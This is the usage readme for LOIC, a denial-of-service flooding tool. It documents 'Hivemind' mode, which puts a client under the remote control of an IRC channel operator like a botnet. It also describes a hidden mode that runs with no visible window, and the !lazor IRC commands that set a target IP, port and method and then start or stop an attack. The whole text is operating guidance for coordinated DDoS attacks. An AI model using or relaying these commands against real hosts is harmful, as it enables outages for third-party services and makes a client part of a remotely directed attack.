|| HIVEMIND/HIDDEN MODE ||
==========================

HIVE MIND mode will connect your client to an IRC server so it can be controlled
remotely. Think of it like a voluntary botnet. They might even make your client
do naughty things, so beware.

Note: It does NOT allow remote administration of your machine, or anything shit
like that, it is literally just control of loic itself.

If you want to start up in hivemind, run like this:
 LOIC.exe /hivemind irc.server.address
It will connect to irc://irc.server.adress:6667/loic

You can also specify port and channel
 LOIC.exe /hivemind irc.server.address 1234 #secret
It will connect to irc://irc.server.adress:1234/secret

In order to do hivemind hidden run like this:
 LOIC.exe /hidden /hivemind irc.server.address
It will connect to irc://irc.server.adress:6667/loic without any visible GUI

==============================
|| CONTROLING LOIC FROM IRC ||
==============================

As an OP, Admin or Owner set a channel topic or type message with (as an example):
!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true

To start attack type
!lazor start

Or just append "start" in the END of the topic
!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true start

To reset options back to default:
!lazor default

To stop attack:
!lazor stop

And remove "start" from topic (if exists)
You can also replace "start" by "stop" in the END of the topic.

Take a look at source for more details.
